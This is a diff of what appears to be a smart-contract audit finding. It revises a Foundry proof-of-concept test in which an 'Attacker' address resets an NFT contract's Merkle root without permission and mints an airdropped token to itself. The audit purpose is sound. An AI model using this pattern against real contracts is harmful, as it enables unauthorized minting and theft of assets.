@@ -38,18 +38,20 @@ As a result, the attacker can reset the contract's Merkle Root without any restr
 
 ```solidity
     function test_setMerkleProofWithoutPermission() public {
+        address Attacker = makeAddr("Attacker");
+
+        vm.startPrank(Attacker);
         bytes32[] memory data = new bytes32[](2);
-        data[0] = keccak256(abi.encodePacked(ALICE, uint256(16)));
-        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
+        data[0] = keccak256(abi.encodePacked(Attacker, uint256(16)));
+        data[1] = keccak256(abi.encodePacked(Attacker, uint256(19)));
         bytes32 root = m.getRoot(data);
 
-        ALICE_PROOF_1 = m.getProof(data, 0);
-        ALICE_PROOF_2 = m.getProof(data, 1);
+        PROOF_1 = m.getProof(data, 0);
+        PROOF_2 = m.getProof(data, 1);
 
-        vm.startPrank(ALICE);
         nft.setMerkleRoot(root);
-        nft.mintAirdrops(uint256(16), ALICE_PROOF_1);
-        assertEq(nft.ownerOf(16), ALICE);
+        nft.mintAirdrops(uint256(16), PROOF_1);
+        assertEq(nft.ownerOf(16), Attacker);
         vm.stopPrank();
     }
 ```
